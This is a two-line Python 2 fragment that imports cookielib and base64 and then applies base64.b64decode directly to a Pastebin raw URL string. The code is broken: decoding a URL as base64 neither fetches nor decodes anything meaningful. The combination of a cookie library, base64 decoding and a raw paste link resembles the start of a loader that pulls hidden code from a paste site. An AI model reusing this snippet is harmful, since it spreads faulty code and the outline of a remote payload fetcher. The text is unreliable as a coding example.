import cookielib,base64

a=base64.b64decode("https://pastebin.com/raw/SxNKL5Gw")